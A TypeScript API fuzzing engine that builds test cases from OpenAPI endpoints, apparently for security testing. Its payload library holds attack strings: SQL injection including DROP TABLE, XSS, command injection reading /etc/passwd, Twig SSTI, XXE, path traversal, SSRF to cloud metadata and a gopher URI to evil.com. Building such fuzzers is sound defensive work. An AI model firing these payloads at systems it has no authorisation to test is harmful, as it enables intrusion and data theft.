import { randomUUID } from "crypto";

export interface FuzzPayload {
  id: string;
  category: FuzzCategory;
  subcategory: string;
  value: any;
  description: string;
  expectedBehavior: "error" | "validation_fail" | "type_coercion" | "boundary" | "injection";
  riskLevel: "critical" | "high" | "medium" | "low";
}

export type FuzzCategory = 
  | "type_mutation"
  | "null_injection"
  | "boundary_value"
  | "format_violation"
  | "encoding"
  | "injection"
  | "overflow";

export interface ParameterSchema {
  name: string;
  type: string;
  format?: string;
  in: "path" | "query" | "header" | "body" | "formData";
  required?: boolean;
  minimum?: number;
  maximum?: number;
  minLength?: number;
  maxLength?: number;
  pattern?: string;
  enum?: string[];
  items?: { type: string };
}

export interface FuzzTestCase {
  id: string;
  endpointPath: string;
  method: string;
  parameter: ParameterSchema;
  payload: FuzzPayload;
  originalValue?: any;
  generatedAt: Date;
}

export interface FuzzResult {
  testCaseId: string;
  endpointPath: string;
  method: string;
  parameter: string;
  payload: FuzzPayload;
  statusCode: number;
  responseTime: number;
  responseBody?: string;
  responseHeaders?: Record<string, string>;
  anomalyDetected: boolean;
  anomalyType?: string;
  anomalyDetails?: string;
  severity?: "critical" | "high" | "medium" | "low" | "info";
}

class ApiFuzzingEngine {
  private typeMutationPayloads = new Map<string, FuzzPayload[]>();
  private nullPayloads: FuzzPayload[] = [];
  private boundaryPayloads = new Map<string, FuzzPayload[]>();
  private formatPayloads = new Map<string, FuzzPayload[]>();
  private encodingPayloads: FuzzPayload[] = [];
  private injectionPayloads: FuzzPayload[] = [];

  constructor() {
    this.initializePayloadLibrary();
  }

  private initializePayloadLibrary() {
    this.typeMutationPayloads.set("string", [
      { id: "tm-s-1", category: "type_mutation", subcategory: "string_to_int", value: 12345, description: "Integer instead of string", expectedBehavior: "type_coercion", riskLevel: "medium" },
      { id: "tm-s-2", category: "type_mutation", subcategory: "string_to_float", value: 123.456, description: "Float instead of string", expectedBehavior: "type_coercion", riskLevel: "medium" },
      { id: "tm-s-3", category: "type_mutation", subcategory: "string_to_bool", value: true, description: "Boolean instead of string", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "tm-s-4", category: "type_mutation", subcategory: "string_to_array", value: ["a", "b", "c"], description: "Array instead of string", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-s-5", category: "type_mutation", subcategory: "string_to_object", value: { key: "value" }, description: "Object instead of string", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-s-6", category: "type_mutation", subcategory: "string_to_empty", value: "", description: "Empty string", expectedBehavior: "validation_fail", riskLevel: "low" },
    ]);

    this.typeMutationPayloads.set("integer", [
      { id: "tm-i-1", category: "type_mutation", subcategory: "int_to_string", value: "not_a_number", description: "String instead of integer", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-i-2", category: "type_mutation", subcategory: "int_to_float", value: 123.999, description: "Float instead of integer", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "tm-i-3", category: "type_mutation", subcategory: "int_to_negative", value: -99999999, description: "Large negative integer", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "tm-i-4", category: "type_mutation", subcategory: "int_to_array", value: [1, 2, 3], description: "Array instead of integer", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-i-5", category: "type_mutation", subcategory: "int_to_hex", value: "0xFF", description: "Hex string instead of integer", expectedBehavior: "error", riskLevel: "low" },
      { id: "tm-i-6", category: "type_mutation", subcategory: "int_to_scientific", value: "1e10", description: "Scientific notation string", expectedBehavior: "type_coercion", riskLevel: "medium" },
    ]);

    this.typeMutationPayloads.set("number", [
      { id: "tm-n-1", category: "type_mutation", subcategory: "num_to_string", value: "NaN", description: "NaN string instead of number", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-n-2", category: "type_mutation", subcategory: "num_to_infinity", value: "Infinity", description: "Infinity string", expectedBehavior: "error", riskLevel: "high" },
      { id: "tm-n-3", category: "type_mutation", subcategory: "num_negative_infinity", value: "-Infinity", description: "Negative Infinity string", expectedBehavior: "error", riskLevel: "high" },
      { id: "tm-n-4", category: "type_mutation", subcategory: "num_to_object", value: { number: 42 }, description: "Object instead of number", expectedBehavior: "error", riskLevel: "medium" },
    ]);

    this.typeMutationPayloads.set("boolean", [
      { id: "tm-b-1", category: "type_mutation", subcategory: "bool_to_string", value: "true", description: "String true instead of boolean", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "tm-b-2", category: "type_mutation", subcategory: "bool_to_int", value: 1, description: "Integer 1 instead of boolean", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "tm-b-3", category: "type_mutation", subcategory: "bool_to_string_yes", value: "yes", description: "String yes instead of boolean", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "tm-b-4", category: "type_mutation", subcategory: "bool_to_null_string", value: "null", description: "String null", expectedBehavior: "error", riskLevel: "medium" },
    ]);

    this.typeMutationPayloads.set("array", [
      { id: "tm-a-1", category: "type_mutation", subcategory: "array_to_string", value: "not_an_array", description: "String instead of array", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-a-2", category: "type_mutation", subcategory: "array_to_object", value: { items: ["a", "b"] }, description: "Object with array property", expectedBehavior: "error", riskLevel: "medium" },
      { id: "tm-a-3", category: "type_mutation", subcategory: "array_mixed_types", value: [1, "two", true, null, { nested: true }], description: "Mixed type array", expectedBehavior: "validation_fail", riskLevel: "medium" },
      { id: "tm-a-4", category: "type_mutation", subcategory: "array_deeply_nested", value: [[[[["deep"]]]]], description: "Deeply nested array", expectedBehavior: "error", riskLevel: "high" },
    ]);

    this.nullPayloads = [
      { id: "null-1", category: "null_injection", subcategory: "null_value", value: null, description: "Null value", expectedBehavior: "validation_fail", riskLevel: "medium" },
      { id: "null-2", category: "null_injection", subcategory: "undefined_value", value: undefined, description: "Undefined value", expectedBehavior: "validation_fail", riskLevel: "medium" },
      { id: "null-3", category: "null_injection", subcategory: "null_string", value: "null", description: "String 'null'", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "null-4", category: "null_injection", subcategory: "undefined_string", value: "undefined", description: "String 'undefined'", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "null-5", category: "null_injection", subcategory: "nil_string", value: "nil", description: "String 'nil' (Ruby/Perl style)", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "null-6", category: "null_injection", subcategory: "none_string", value: "None", description: "String 'None' (Python style)", expectedBehavior: "type_coercion", riskLevel: "low" },
      { id: "null-7", category: "null_injection", subcategory: "empty_object", value: {}, description: "Empty object", expectedBehavior: "validation_fail", riskLevel: "medium" },
      { id: "null-8", category: "null_injection", subcategory: "empty_array", value: [], description: "Empty array", expectedBehavior: "validation_fail", riskLevel: "low" },
    ];

    this.boundaryPayloads.set("integer", [
      { id: "bv-i-1", category: "boundary_value", subcategory: "int32_max", value: 2147483647, description: "INT32 max value", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "bv-i-2", category: "boundary_value", subcategory: "int32_min", value: -2147483648, description: "INT32 min value", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "bv-i-3", category: "boundary_value", subcategory: "int32_overflow", value: 2147483648, description: "INT32 overflow", expectedBehavior: "boundary", riskLevel: "high" },
      { id: "bv-i-4", category: "boundary_value", subcategory: "int64_max", value: "9223372036854775807", description: "INT64 max value (as string)", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "bv-i-5", category: "boundary_value", subcategory: "zero", value: 0, description: "Zero value", expectedBehavior: "boundary", riskLevel: "low" },
      { id: "bv-i-6", category: "boundary_value", subcategory: "negative_one", value: -1, description: "Negative one", expectedBehavior: "boundary", riskLevel: "medium" },
    ]);

    this.boundaryPayloads.set("string", [
      { id: "bv-s-1", category: "boundary_value", subcategory: "long_string", value: "A".repeat(10000), description: "10K character string", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "bv-s-2", category: "boundary_value", subcategory: "very_long_string", value: "B".repeat(100000), description: "100K character string", expectedBehavior: "boundary", riskLevel: "high" },
      { id: "bv-s-3", category: "boundary_value", subcategory: "single_char", value: "X", description: "Single character", expectedBehavior: "boundary", riskLevel: "low" },
      { id: "bv-s-4", category: "boundary_value", subcategory: "whitespace_only", value: "   \t\n\r   ", description: "Whitespace only", expectedBehavior: "validation_fail", riskLevel: "medium" },
      { id: "bv-s-5", category: "boundary_value", subcategory: "unicode_max", value: "\uFFFF".repeat(100), description: "High Unicode characters", expectedBehavior: "boundary", riskLevel: "medium" },
    ]);

    this.boundaryPayloads.set("number", [
      { id: "bv-n-1", category: "boundary_value", subcategory: "float_max", value: 1.7976931348623157e+308, description: "Float64 max", expectedBehavior: "boundary", riskLevel: "high" },
      { id: "bv-n-2", category: "boundary_value", subcategory: "float_min", value: 5e-324, description: "Float64 min positive", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "bv-n-3", category: "boundary_value", subcategory: "float_precision", value: 0.1 + 0.2, description: "Floating point precision issue", expectedBehavior: "boundary", riskLevel: "low" },
      { id: "bv-n-4", category: "boundary_value", subcategory: "negative_zero", value: -0, description: "Negative zero", expectedBehavior: "boundary", riskLevel: "low" },
    ]);

    this.formatPayloads.set("email", [
      { id: "fmt-e-1", category: "format_violation", subcategory: "invalid_email", value: "not_an_email", description: "Invalid email format", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "fmt-e-2", category: "format_violation", subcategory: "email_no_domain", value: "user@", description: "Email without domain", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "fmt-e-3", category: "format_violation", subcategory: "email_special_chars", value: "user+test'--@domain.com", description: "Email with SQL chars", expectedBehavior: "injection", riskLevel: "high" },
      { id: "fmt-e-4", category: "format_violation", subcategory: "email_xss", value: "user<script>@domain.com", description: "Email with XSS attempt", expectedBehavior: "injection", riskLevel: "high" },
      { id: "fmt-e-5", category: "format_violation", subcategory: "email_unicode", value: "üser@dömain.cöm", description: "Email with unicode", expectedBehavior: "validation_fail", riskLevel: "medium" },
    ]);

    this.formatPayloads.set("uuid", [
      { id: "fmt-u-1", category: "format_violation", subcategory: "invalid_uuid", value: "not-a-uuid", description: "Invalid UUID format", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "fmt-u-2", category: "format_violation", subcategory: "uuid_short", value: "12345678-1234-1234-1234", description: "Truncated UUID", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "fmt-u-3", category: "format_violation", subcategory: "uuid_sql", value: "12345678-1234-1234-1234-123456789012' OR '1'='1", description: "UUID with SQL injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "fmt-u-4", category: "format_violation", subcategory: "uuid_null", value: "00000000-0000-0000-0000-000000000000", description: "Null UUID", expectedBehavior: "boundary", riskLevel: "medium" },
    ]);

    this.formatPayloads.set("date", [
      { id: "fmt-d-1", category: "format_violation", subcategory: "invalid_date", value: "not-a-date", description: "Invalid date string", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "fmt-d-2", category: "format_violation", subcategory: "date_overflow", value: "9999-12-31", description: "Far future date", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "fmt-d-3", category: "format_violation", subcategory: "date_underflow", value: "0001-01-01", description: "Ancient date", expectedBehavior: "boundary", riskLevel: "medium" },
      { id: "fmt-d-4", category: "format_violation", subcategory: "date_epoch", value: "1970-01-01", description: "Unix epoch", expectedBehavior: "boundary", riskLevel: "low" },
      { id: "fmt-d-5", category: "format_violation", subcategory: "date_negative", value: "-0001-01-01", description: "Negative year", expectedBehavior: "validation_fail", riskLevel: "medium" },
    ]);

    this.formatPayloads.set("uri", [
      { id: "fmt-uri-1", category: "format_violation", subcategory: "invalid_uri", value: "not a uri", description: "Invalid URI", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "fmt-uri-2", category: "format_violation", subcategory: "uri_ssrf", value: "http://169.254.169.254/latest/meta-data/", description: "SSRF to AWS metadata", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "fmt-uri-3", category: "format_violation", subcategory: "uri_localhost", value: "http://localhost:22/", description: "Localhost access", expectedBehavior: "injection", riskLevel: "high" },
      { id: "fmt-uri-4", category: "format_violation", subcategory: "uri_file", value: "file:///etc/passwd", description: "File protocol", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "fmt-uri-5", category: "format_violation", subcategory: "uri_gopher", value: "gopher://evil.com/_GET%20/", description: "Gopher protocol", expectedBehavior: "injection", riskLevel: "high" },
    ]);

    this.encodingPayloads = [
      { id: "enc-1", category: "encoding", subcategory: "utf8_bom", value: "\uFEFFtest", description: "UTF-8 BOM prefix", expectedBehavior: "validation_fail", riskLevel: "low" },
      { id: "enc-2", category: "encoding", subcategory: "null_byte", value: "test\x00injection", description: "Null byte injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "enc-3", category: "encoding", subcategory: "url_encoded", value: "%27%20OR%20%271%27=%271", description: "URL encoded SQL injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "enc-4", category: "encoding", subcategory: "double_url_encoded", value: "%2527%2520OR%2520%25271%2527%253D%25271", description: "Double URL encoded", expectedBehavior: "injection", riskLevel: "high" },
      { id: "enc-5", category: "encoding", subcategory: "unicode_escape", value: "\\u0027 OR \\u00271\\u0027=\\u00271", description: "Unicode escape SQL injection", expectedBehavior: "injection", riskLevel: "high" },
      { id: "enc-6", category: "encoding", subcategory: "html_entities", value: "&apos; OR &apos;1&apos;=&apos;1", description: "HTML entity SQL injection", expectedBehavior: "injection", riskLevel: "medium" },
      { id: "enc-7", category: "encoding", subcategory: "mixed_case", value: "SeLeCt * FrOm users", description: "Mixed case bypass", expectedBehavior: "injection", riskLevel: "medium" },
    ];

    this.injectionPayloads = [
      { id: "inj-1", category: "injection", subcategory: "sql_basic", value: "' OR '1'='1", description: "Basic SQL injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-2", category: "injection", subcategory: "sql_union", value: "' UNION SELECT null,null,null--", description: "UNION SQL injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-3", category: "injection", subcategory: "sql_stacked", value: "'; DROP TABLE users;--", description: "Stacked query injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-4", category: "injection", subcategory: "xss_basic", value: "<script>alert(1)</script>", description: "Basic XSS", expectedBehavior: "injection", riskLevel: "high" },
      { id: "inj-5", category: "injection", subcategory: "xss_img", value: "<img src=x onerror=alert(1)>", description: "IMG tag XSS", expectedBehavior: "injection", riskLevel: "high" },
      { id: "inj-6", category: "injection", subcategory: "xss_svg", value: "<svg onload=alert(1)>", description: "SVG XSS", expectedBehavior: "injection", riskLevel: "high" },
      { id: "inj-7", category: "injection", subcategory: "cmd_basic", value: "; cat /etc/passwd", description: "Command injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-8", category: "injection", subcategory: "cmd_backtick", value: "`cat /etc/passwd`", description: "Backtick command injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-9", category: "injection", subcategory: "ssti_jinja", value: "{{7*7}}", description: "Jinja2 SSTI", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-10", category: "injection", subcategory: "ssti_twig", value: "{{_self.env.getFilter('system')('id')}}", description: "Twig SSTI", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-11", category: "injection", subcategory: "xxe_basic", value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', description: "XXE injection", expectedBehavior: "injection", riskLevel: "critical" },
      { id: "inj-12", category: "injection", subcategory: "path_traversal", value: "../../../etc/passwd", description: "Path traversal", expectedBehavior: "injection", riskLevel: "critical" },
    ];
  }

  generatePayloadsForParameter(param: ParameterSchema): FuzzPayload[] {
    const payloads: FuzzPayload[] = [];
    const type = param.type?.toLowerCase() || "string";
    const format = param.format?.toLowerCase();

    const typePayloads = this.typeMutationPayloads.get(type) || this.typeMutationPayloads.get("string")!;
    payloads.push(...typePayloads);

    payloads.push(...this.nullPayloads);

    const boundaryPayloads = this.boundaryPayloads.get(type);
    if (boundaryPayloads) {
      payloads.push(...boundaryPayloads);
    }

    if (format) {
      const formatPayloads = this.formatPayloads.get(format);
      if (formatPayloads) {
        payloads.push(...formatPayloads);
      }
    }

    if (["string", "text"].includes(type)) {
      payloads.push(...this.encodingPayloads);
      payloads.push(...this.injectionPayloads);
    }

    if (param.minimum !== undefined || param.maximum !== undefined) {
      if (param.minimum !== undefined) {
        payloads.push({
          id: `dynamic-min-1-${randomUUID().slice(0, 8)}`,
          category: "boundary_value",
          subcategory: "below_minimum",
          value: param.minimum - 1,
          description: `Below minimum (${param.minimum})`,
          expectedBehavior: "validation_fail",
          riskLevel: "medium",
        });
      }
      if (param.maximum !== undefined) {
        payloads.push({
          id: `dynamic-max-1-${randomUUID().slice(0, 8)}`,
          category: "boundary_value",
          subcategory: "above_maximum",
          value: param.maximum + 1,
          description: `Above maximum (${param.maximum})`,
          expectedBehavior: "validation_fail",
          riskLevel: "medium",
        });
      }
    }

    if (param.minLength !== undefined || param.maxLength !== undefined) {
      if (param.minLength !== undefined && param.minLength > 0) {
        payloads.push({
          id: `dynamic-minlen-${randomUUID().slice(0, 8)}`,
          category: "boundary_value",
          subcategory: "below_minlength",
          value: "A".repeat(param.minLength - 1),
          description: `Below minLength (${param.minLength})`,
          expectedBehavior: "validation_fail",
          riskLevel: "low",
        });
      }
      if (param.maxLength !== undefined) {
        payloads.push({
          id: `dynamic-maxlen-${randomUUID().slice(0, 8)}`,
          category: "boundary_value",
          subcategory: "above_maxlength",
          value: "A".repeat(param.maxLength + 1),
          description: `Above maxLength (${param.maxLength})`,
          expectedBehavior: "validation_fail",
          riskLevel: "medium",
        });
      }
    }

    if (param.enum && param.enum.length > 0) {
      payloads.push({
        id: `dynamic-enum-${randomUUID().slice(0, 8)}`,
        category: "format_violation",
        subcategory: "invalid_enum",
        value: "INVALID_ENUM_VALUE_" + randomUUID().slice(0, 8),
        description: "Invalid enum value",
        expectedBehavior: "validation_fail",
        riskLevel: "low",
      });
    }

    return payloads;
  }

  generateTestCases(
    endpointPath: string,
    method: string,
    parameters: ParameterSchema[]
  ): FuzzTestCase[] {
    const testCases: FuzzTestCase[] = [];

    for (const param of parameters) {
      const payloads = this.generatePayloadsForParameter(param);

      for (const payload of payloads) {
        testCases.push({
          id: `fuzz-${randomUUID()}`,
          endpointPath,
          method,
          parameter: param,
          payload,
          generatedAt: new Date(),
        });
      }
    }

    return testCases;
  }

  generateTestCasesFromOpenAPIEndpoint(endpoint: {
    path: string;
    method: string;
    parameters?: any[];
    requestBody?: {
      schema?: any;
      contentTypes?: string[];
    };
  }): FuzzTestCase[] {
    const testCases: FuzzTestCase[] = [];

    if (endpoint.parameters) {
      const params: ParameterSchema[] = endpoint.parameters.map((p: any) => ({
        name: p.name,
        type: p.type || p.schema?.type || "string",
        format: p.format || p.schema?.format,
        in: p.in || "query",
        required: p.required,
        minimum: p.schema?.minimum,
        maximum: p.schema?.maximum,
        minLength: p.schema?.minLength,
        maxLength: p.schema?.maxLength,
        pattern: p.schema?.pattern,
        enum: p.enum || p.schema?.enum,
      }));

      testCases.push(...this.generateTestCases(endpoint.path, endpoint.method, params));
    }

    if (endpoint.requestBody?.schema) {
      const bodyParams = this.extractParametersFromSchema(endpoint.requestBody.schema);
      for (const param of bodyParams) {
        param.in = "body";
      }
      testCases.push(...this.generateTestCases(endpoint.path, endpoint.method, bodyParams));
    }

    return testCases;
  }

  private extractParametersFromSchema(schema: any, prefix = ""): ParameterSchema[] {
    const params: ParameterSchema[] = [];

    if (schema.type === "object" && schema.properties) {
      for (const [name, prop] of Object.entries(schema.properties)) {
        const propSchema = prop as any;
        const fullName = prefix ? `${prefix}.${name}` : name;

        if (propSchema.type === "object" && propSchema.properties) {
          params.push(...this.extractParametersFromSchema(propSchema, fullName));
        } else {
          params.push({
            name: fullName,
            type: propSchema.type || "string",
            format: propSchema.format,
            in: "body",
            required: schema.required?.includes(name),
            minimum: propSchema.minimum,
            maximum: propSchema.maximum,
            minLength: propSchema.minLength,
            maxLength: propSchema.maxLength,
            pattern: propSchema.pattern,
            enum: propSchema.enum,
          });
        }
      }
    }

    return params;
  }

  filterTestCasesByCategory(testCases: FuzzTestCase[], categories: FuzzCategory[]): FuzzTestCase[] {
    return testCases.filter(tc => categories.includes(tc.payload.category));
  }

  filterTestCasesByRisk(testCases: FuzzTestCase[], minRisk: "critical" | "high" | "medium" | "low"): FuzzTestCase[] {
    const riskLevels = ["low", "medium", "high", "critical"];
    const minIndex = riskLevels.indexOf(minRisk);
    return testCases.filter(tc => riskLevels.indexOf(tc.payload.riskLevel) >= minIndex);
  }

  getPayloadCategories(): FuzzCategory[] {
    return ["type_mutation", "null_injection", "boundary_value", "format_violation", "encoding", "injection", "overflow"];
  }

  getSupportedFormats(): string[] {
    return Array.from(this.formatPayloads.keys());
  }
}

export const apiFuzzingEngine = new ApiFuzzingEngine();
